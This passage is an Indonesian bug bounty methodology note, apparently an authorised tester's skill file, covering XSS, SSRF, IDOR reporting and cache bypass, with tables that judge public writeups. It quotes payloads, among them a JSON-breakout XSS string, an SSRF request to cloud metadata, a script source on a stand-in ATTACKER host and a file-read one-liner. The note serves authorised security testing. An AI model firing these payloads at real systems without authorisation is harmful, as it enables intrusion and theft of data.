- [ ] Kalau nilai masuk ke `script src` dan host kita bisa mengirim JavaScript, ukur dampaknya: apakah cookie session HttpOnly, apakah token ada di localStorage, dan apakah ada aksi sensitif yang bisa dipanggil in-page
- [ ] Stop di bukti minimal: permintaan keluar ke host kita plus eksekusi terkontrol di halaman. Jangan mengambil data pengguna lain

### B. JSON breakout menjadi tag skrip

- [ ] Decode payload URL-encoded sebelum menguji. Contoh dari feed: `%22%2C%22title%22%3A%22alert(3140723)%22%2C%22title_tag%22%3A%22ScRiPt%22%2C%22z%22%3A%22`
- [ ] Hasil decode: `","title":"alert(3140723)","title_tag":"ScRiPt","z":"`. Tiga bagian penting: penutup string, field `title` berisi ekspresi, dan field `title_tag` berisi nama tag dengan case campuran
- [ ] Cari parameter yang nilainya disisipkan ke objek JSON di sisi klien, terutama konfigurasi chart, widget, atau komponen yang merender berdasarkan field `title_tag`, `tag`, atau `type`
- [ ] Uji apakah aplikasi membuat elemen dengan `document.createElement(nilai)` atau menggabungkan nama tag ke `innerHTML`. Case campuran seperti `ScRiPt` sering lolos filter huruf kecil
- [ ] Baseline wajib: kirim nilai jinak seperti `title_tag=span` dan pastikan halaman merender elemen span. Baru setelah itu coba variasi casing
- [ ] Bedakan reflected dari stored. Kalau nilai tersimpan dan muncul di halaman lain, dampaknya lebih luas dan perlu pelaporan terpisah
- [ ] Popup `alert` hanya membuktikan eksekusi. Cek HttpOnly dan akses token sebelum klaim ATO, mengikuti aturan 10b

### C. SSRF IMDS dari feed

- [ ] Payload `{"url":"http://169.254.169.254/latest/meta-data/"}` mengarah ke AWS IMDSv1. Ini generik dan tidak membuktikan target memakai AWS
- [ ] Pastikan scope tertulis mengizinkan uji SSRF ke metadata cloud. Beberapa program melarang eksplorasi infrastruktur cloud
- [ ] Uji dulu dengan permintaan jinak ke host eksternal milik sendiri untuk membuktikan parameter benar-benar memicu fetch server-side
- [ ] Kalau target lolos, batasi bukti pada fakta bahwa metadata endpoint bisa dijangkau. Jangan mengambil kredensial atau role IAM

### D. Pemetaan ke program yang scope-nya sudah disimpan

| Program | Status policy live yang dibaca ulang 24 Nov 2026 | Kesiapan pola ini |
|---------|--------------------------------------------------|-------------------|
| BlazePhoenix | `blazephoenix.xyz/bounty`: stored atau reflected XSS dengan impact di website/API masuk Medium. Self-XSS dan text injection tanpa impact ditolak | Cocok untuk A dan B kalau ada sink nyata. Wajib tunjukkan impact pada trade atau sesi |
| National Compute | `docs.nationalcompute.com/bug-bounty`: reflected/DOM XSS Medium $250, stored XSS High $1000, Critical $10k ke atas kalau ada ATO. Self-XSS dan XSS yang butuh paste korban ditolak | Cocok untuk A dan B. Buktikan interaksi korban dan HttpOnly sebelum klaim tier |
| Probly | Policy live `docs.probly.com/bug-bounty-program/program-policy` gagal ditarik dari environment ini. File `E:/audit/probly/scope.json` hanya snapshot 23 Nov 2026 | Jangan dianggap in-scope sebelum policy live dibaca ulang |

> Pelajaran tahan lama: satu baris payload dari X adalah hipotesis. Tentukan source, sink, dan konteks rendering dulu. Tanpa baseline dan tanpa pengecekan HttpOnly, jangan menaikkan klaim ke ATO.

---

## 11. Template laporan

**Judul:** `[Tipe kerentanan] di [endpoint] memungkinkan [impact]`

**Ringkasan:** 2-3 kalimat. Apa bug-nya, siapa yang bisa, apa dampaknya.

**Langkah reproduksi:**
1. Siapkan akun A dan B, sebut marker unik masing-masing
2. Login sebagai A, ambil request berikut (sertakan method, path, header penting, body)
3. Ganti nilai ID dengan milik B, kirim
4. Tampilkan respons yang membuktikan akses

```
GET /api/backend/v1/skills/<VICTIM_UUID>/diagram HTTP/1.1
Host: target.com
Cookie: <ACCOUNT_A_SESSION>
```

**Bukti yang wajib ada:**
- [ ] Request dan response lengkap (marker unik B kelihatan di response)
- [ ] Perbandingan endpoint yang 403 vs endpoint yang 200 (kalau ada)
- [ ] Timestamp dan akun yang dipakai
- [ ] Efek samping kalau blind IDOR
- [ ] Untuk SSRF: callback ke server sendiri hanya membuktikan backend melakukan fetch, bukan bahwa ia bisa mengakses resource internal. Butuh bukti akses ke layanan internal yang memang diizinkan untuk diuji

**Impact:**
- [ ] Sebutkan persis apa yang bisa dibaca/diubah/dihapus
- [ ] Sebutkan ruang lingkup: satu pengguna, satu organisasi, atau cross-tenant
- [ ] Jangan klaim cross-tenant / ATO kalau belum dibuktikan

**Remediasi:**
- [ ] Object-level authorization di server untuk setiap request dan setiap aksi
- [ ] Query database di-scope ke user yang login, bukan filter setelah fetch
- [ ] Check terpusat, disalin juga ke endpoint turunan dan secondary flow
- [ ] Default deny, respons yang sama untuk "tidak ada" dan "bukan punya kamu"

## 11b. Cache edge yang meniru authorization bypass (Atharv Chawan, 18 Jul 2026)

Sumber: writeup "It Worked, Then It Didn't, Then I Understood Why", finding asli. Bug hilang setelah 15 menit dan hampir dibatalkan, ternyata karena cache. Tidak ada angka bayaran yang dipakai.

- [ ] Kalau bypass authz hilang beberapa menit kemudian, jangan langsung anggap salah uji. Periksa header `X-Cache`, `Age`, dan `Cache-Control`
- [ ] Ulangi dengan incognito plus container terpisah untuk membedakan cache browser dari cache server
- [ ] Coba cache-buster atau query unik, lalu bandingkan apakah hasil berubah
- [ ] Tanya siapa yang menyimpan respons: browser, CDN, reverse proxy, atau aplikasi. Remediasi berbeda untuk tiap lapis
- [ ] Bukti: dua respons dengan header cache yang berbeda, waktu pengujian, dan kondisi objek yang sebenarnya

---

## 12. Kepercayaan email masuk dan domain SSO (Zendesk, 2024)

Sumber: case study analitis @masimshahzad dari disclosure publik Daniel/hackermondev. Repro dihilangkan, klaim $50.000+ berasal dari peneliti, Zendesk tidak membayar.

- [ ] Reply address tiket yang dibangun dari nomor berurutan: coba nomor di sekitar tiket sendiri
- [ ] Apakah balasan email diverifikasi pengirimnya (DMARC alignment)? Kalau tidak, siapa pun bisa menambahkan CC dan ikut membaca riwayat tiket
- [ ] Cek apakah domain support@ dipakai juga sebagai domain SSO. Email verifikasi login yang masuk ke tiket bisa membuka workspace
- [ ] Uji jalur login alternatif (Sign in with Apple, magic link) yang verifikasinya lewat email, bukan lewat mekanisme yang sudah dikunci
- [ ] "Out of scope" adalah soal program, bukan soal risiko. Tetap catat kalau impact nyata

---

## Urutan kerja singkat

1. Mapping referensi objek, parameter pilih kolom, dan parameter query pada endpoint print/preview/export
1b. JS bundle: petakan endpoint sebelum redirect, uji header auth kosong, cek source map yang terekspos
1c. CSPT: uji nilai URL yang dipakai JS menyusun path request, traversal + null body pada endpoint permissions
2. IDOR: tukar ID di semua method dan secondary flow, lalu coba wildcard/blank bila kontrol tidak ada
2b. Relasi antarfield dan chain lookup ke detail: produk vs aset sumber, tenant vs user, email ke ID
2c. Role dan membership: uji scope organisasi pada endpoint anggota
3. Endpoint turunan: bandingkan 403 vs 200
4. Mass assignment: field ekstra di response, fuzz, lintas endpoint
5. OAuth: bandingkan nilai tiap langkah, cek binding token, exact match callback, custom-scheme deep link, dan URI exchange di sisi server
6. SQLi identifier: kolom ngarang, error oracle, trik alias
6b. SSRF: uji redirect hop kedua terhadap allowlist
6c. SSRF jalur sekunder: bandingkan alur utama vs alternatif, ukur latency kalau blind
7. Re-auth: coba aksi sensitif dengan session lock
8. Recovery: atomic attempt budget dan single-use ticket
9. Parser confusion: nama yang dipakai ulang untuk konfirmasi
9b. Race: burst HTTP/2 tersinkron pada alur kupon/saldo
9c. Path normalization: matrix parameter smuggling pada path policy
10. Session: regenerasi dan atribut cookie
10b. Cookie remember-me: differential lintas origin nyata, jangan percaya SameSite saja
10c. Reflected XSS: semua titik refleksi, bypass tag WAF, dan flag HttpOnly sebelum klaim ATO
10d. Config-driven XSS: baca bundle pihak ketiga untuk source dan sink, decode JSON breakout, baseline nilai jinak, lalu ukur dampak sebelum klaim tier
11. Email masuk: nomor tiket, DMARC, dan domain SSO
11b. Cache: periksa X-Cache dan Age kalau bypass hilang sendiri
12. Dokumentasi: request + response + marker + impact yang jujur

---

## Catatan provensi

Dari thread 21 Nov 2026 (8 artikel):

| Artikel | Status | Dipakai |
|---------|--------|---------|
| Null byte injection token name (Islam Hamdy) | Finding asli, CVSS 7.1 | Ya, pola parser confusion |
| Mass assignment simplified (João Tonetto) | Finding asli + panduan | Ya, pola mass assignment |
| $1000 IDOR shared AI chat (Kianoush) | Finding asli, dibayar 20 Nov 2026 | Ya, pola endpoint turunan |
| IDOR Explained (Vignesh) | Panduan generik | Ya, metodologi |
| Cara cari XSS (Samadhan) | Panduan generik | Tidak, fondasi saja |
| Session management ATO (Samadhan) | Evidence lemah, penulis sendiri ragu | Tidak |
| CVE-2026-99312 KVM | Berita, cuma intro | Tidak, di luar scope |
| OpenSSL 9.8 vs Low | Member-only, cuma teaser | Tidak, klaim tak terverifikasi |

Dari thread 17 Nov 2026 (10 artikel):

| Artikel | Status | Dipakai |
|---------|--------|---------|
| OTO one-click lewat OAuth (Ali Zamini) | Finding asli 2026, detail lengkap | Ya, pola OAuth |
| NEXT_PUBLIC -> SQLi (Akash S.) | Finding asli 2026 | Ya, pola SQLi identifier |
| Stripe lockout ($500) | Case study 2017, repro dihilangkan | Ya, pola re-auth, label historis |
| Microsoft reset race ($50k) | Case study 2020, repro dihilangkan | Ya, pola recovery, label historis |
| Facebook album IDOR ($12.5k) | Case study 2015 | Pola umum sudah tercakup |
| P2 email mod -> ATO | "Illustrative, requires validation" | Tidak, bukan finding nyata |
| CTF matters | Esai edukasi | Tidak |
| Node2Shell CVE-2026-111497 | Intro 1,7 KB | Tidak, tak terverifikasi |
| RAG prompt injection | Member-only, 1,9 KB | Tidak, tak terverifikasi |
| Chrome chain $250k | Bug browser, di luar scope | Tidak |

Dari thread X 22 Nov 2026 (@Bug_Breakdown, 1 artikel):

| Artikel | Status | Dipakai |
|---------|--------|---------|
| No Username. No Password. Just a Header (0xalr) | Finding asli, live render penuh, target tidak disebut, screenshot tidak terbaca | Ya, pola JS endpoint mining + auth header kosong |

Dari thread X 23 Nov 2026 (@Bug_Breakdown, 1 artikel):

| Artikel | Status | Dipakai |
|---------|--------|---------|
| $4.000 Triple-Coupon Glitch (T4nv1) | Member-only teaser; isi menyebut $14.000; pembaca membantah rating P2; request/response tak terbaca | Ya, pola race condition, angka dan rating sebagai klaim |
| Apple HOF Blind SSRF di Podcasts Connect (Anas NadY) | Finding asli, live render lengkap, UUID dan detail di-redacted, tanpa angka bayaran, time-based port scan dengan video PoC | Ya, pola 7c, angka latency sebagai klaim penulis |
| Tool roundup 23 Nov 2026 (ARTEX, Claude-BugHunter, Truvian) | Bukan writeup; penilaian tool ada di file triage terpisah | Tidak |

Dari thread X 23 Nov 2026 (@bountywriteups, 10 artikel):

| Artikel | Status | Dipakai |
|---------|--------|---------|
| Wildcard USPS 60 juta akun (l4zz3rj0d) | Case study historis 2018, sumber utama Krebs terverifikasi, bukan temuan penulis | Ya, pola wildcard tanpa boundary |
| Race Condition Attacks Explained (Vignesh) | Panduan generik, bukan finding asli | Tidak, sudah tercakup skill race-condition-web-api |
| Day 04 Reconnaissance (iamrudhh) | Panduan generik | Tidak |
| I need to flag a problem (arxivgpt) | Bukan writeup, draf AI yang menolak menulis dari sumber rusak | Tidak |
| Coinbase $250k (masimshahzad) | Case study analitis 2022, repro dihilangkan, sumber Coinbase terverifikasi | Ya, pola validasi relasi |
| Booking.com OAuth ATO (masimshahzad) | Case study analitis 2022/2023, repro dihilangkan | Ya, pola rangkaian celah OAuth |
| Zendesk email spoofing (masimshahzad) | Case study analitis 2024, repro dihilangkan, $50k+ klaim peneliti | Ya, pola kepercayaan email masuk |
| GhostTiles FreeRDP (ts247091) | GHSA nyata, tapi client-side native, bukan Web/API | Tidak, di luar scope |
| First 48 Hours (Badger0x) | Esai karier, bukan finding | Tidak |
| P2 SSRF (akashmotkar001) | "Illustrative, requires validation", tanpa host nyata | Tidak, hanya catatan bukti callback |

Dari thread X 23 Nov 2026 (@bugbountywizard, 5 post terakhir, 4 artikel unik):

| Artikel | Status | Dipakai |
|---------|--------|---------|
| One Click Full Control: CSPT to Modify Organization (Mahdi Salhi) | Finding asli, live render penuh, bukti HTTP screenshot, tanpa bayaran, severity "may be Medium" klaim penulis | Ya, pola CSPT + null body jadi state permisif |
| I Found a CSRF Vulnerability by Analyzing Cookies (yOnly_) | Finding asli, PoC HTML ada, tapi Duplicate di YesWeHack, tanpa bayaran, root cause tidak dipastikan penulis | Ya, pola cookie remember-me + differential lintas origin |
| Complete Guide to Browser-Based Vulnerabilities (Akshay Kumar) | Panduan generik 24 menit, bukan finding, tanpa request/response | Tidak, bagian 21.4 CSRFg sudah cross-map ke 1c |
| P2 SSRF Leading to Internal Network Resource Access (Akash Motkar) | Sudah tercatat di thread @bountywriteups 23 Nov di atas | Tidak, duplikat entri |

Semua angka bayaran dan rating CVE di atas adalah klaim yang dikutip penulis dari sumber eksternal, bukan bukti yang bisa diverifikasi di sini.

## Arsip publikasi BugBountywizard (12 artikel, Agustus sampai Oktober 2026)

Sumber: `medium.com/bugbountywizard` redirect ke `bugbountywizard.app`. Daftar artikel diambil dari halaman publikasi plus RSS feed. Tujuh artikel diambil lewat Jina penuh, lima lewat live render karena Jina kena challenge. Publikasi ini bukan akun yang sama dengan @bountywriteups, jadi entri di bawah tidak diduplikat ke tabel sebelumnya.

| Artikel | Status | Dipakai |
|---------|--------|---------|
| SSRF redirect bypass URL filters (Sumit Raj, 25 Okt 2026) | Panduan dengan demo lokal, bukan finding host nyata | Ya, hipotesis di 7b |
| One URL Change Exposed Hidden WordPress Content (The Knower, 27 Okt 2026) | Finding asli, triaged High tapi duplicate, ada potongan kode PHP, tanpa bayaran | Ya, parameter query ke query builder di bagian 1 |
| Android Deep Link Hijacking to ATO (Ahmed M.Abbas, 15 Okt 2026) | Finding asli, triaged dan dibayar, jumlah tidak disebut, target Android native | Ya, catatan custom-scheme di 6, bukan finding Web/API |
| I Red-Teamed 3 AI Agents (Fenil sheta, 6 Okt 2026) | CTF dan metodologi, bukan finding produksi | Tidak, cross-map ke skill agent-mcp-codebase-audit |
| IDOR exposed account information (Samadhan Shimple, 7 Okt 2026) | Finding asli, pola IDOR standar, tidak ada detail baru | Tidak, sudah tercakup di 2 |
| Missing rate limiting AI chat (Samadhan Shimple, 10 Okt 2026) | Penulis sendiri menyatakan hitungan biaya ilustratif, bukan bukti dampak | Tidak |
| WAF Bypass Failed SQLi to Reflected XSS (Darshan Narayan, 11 Sep 2026) | Finding asli, bukti sebagian screenshot, target tidak disebut | Ya, pola 10b |
| My First $100 Bounty IDOR photos (Tanishx0h, 12 Sep 2026) | Cerita generik tanpa pasangan request/response, klaim $100 | Tidak, sudah tercakup di 2 |
| IDOR deletion of organization owner (Saurabh Tripathi, 27 Jan 2025) | Finding asli lama, klaim bayaran $800 | Ya, pola 2c |
| Authorization bypass cache (Atharv Chawan, 18 Jul 2026) | Finding asli, petunjuk dari header cache, tanpa bayaran | Ya, pola 11b |
| Three small bugs cancel anyones booking (Atharv Chawan, 25 Aug 2026) | Finding asli, Duplicate, rangkaian source map dan dua endpoint tanpa ownership | Ya, catatan source map di 1b |
| Email to confirmed IDOR (Atharv Chawan, 2 Aug 2026) | Finding asli, dikonfirmasi dan diperbaiki platform | Ya, catatan chain lookup di 2b |

Catatan retrieval: RSS feed publikasi hanya berisi tujuh item terakhir dan berhenti di 11 Oktober 2026, lebih tua dari postingan X bulan November. Jangan mengira RSS adalah daftar terbaru. Dua artikel dari RSS tidak muncul di halaman publikasi, jadi keduanya tetap dihitung.

Semua angka bayaran, rating, dan status triage di tabel arsip adalah klaim penulis atau status yang mereka laporkan, bukan verifikasi independen di sini.

Dari post X 23 Nov 2026 (@Zerodaylabowner, 1 post):

| Artikel | Status | Dipakai |
|---------|--------|---------|
| 1-Liner Parser Confusion Bypass + CVE-2026-50559 | Infografis repost, kredit gambar ke @BruteLogic / brutelogic.net. CVE asli dan terverifikasi di NVD serta GHSA-qcxp-gm7m-4j5v, tetapi one-liner `%3B/%23/%3F/%00` + `.json/.js/.html` bukan repro CVE dan klaim "HIT 200" tanpa baseline dibuang | Ya, hanya pola 4b dari advisory vendor |

Dari one-liner X @YXN0cm8 (23 Nov 2026, empat caption payload):

| Payload | Status verifikasi | Dipakai |
|---------|-------------------|---------|
| `Function("return this")().GetNativeEngine().ZipFileAsString("../../../../../../etc/...")` | Fungsi `ZipFileAsString` dan `GetFontBinary` nyata dan pernah dilaporkan sebagai native file read di ONLYOFFICE DocumentBuilder issue #147, ditutup Des 2025. Rapid7 mendokumentasikan chain DocBuilder 2026. Rantai `Function("return this")().GetNativeEngine()` tidak ditemukan di sumber publik yang dibaca, jadi tetap klaim penulis | Ya, catatan konteks native file read, bukan pola Web/API generik |
| `{"url":"http://169.254.169.254/latest/meta-data/"}` | SSRF ke IMDSv1 generik. Tidak ada bukti target memakai AWS | Ya, hipotesis 10d-C |
| `<input id=oneTrust value=true data-url=//ATTACKER/z>` | Pola DOM XSS melalui atribut `data-url`, tidak ada request/response publik | Ya, hipotesis 10d-A |
| `%22%2C%22title%22%3A%22alert(3140723)%22%2C%22title_tag%22%3A%22ScRiPt%22%2C%22z%22%3A%22` | JSON breakout ke nama tag setelah didekode konsisten, tetapi tidak ada target maupun bukti eksekusi | Ya, hipotesis 10d-B |

Cek provenance tambahan: kartu reward yang diposting 23 Nov bertanggal 25 Sep 2026, kartu SSRF 22 Nov bertanggal 18 Okt 2026, kartu XSS 20 Nov bertanggal 11 Sep 2026. Jadi caption "Just got a reward" tidak selalu berarti reward baru. Severity dan nominal di kartu adalah klaim yang ditampilkan platform, bukan penilaian yang diverifikasi di sini.
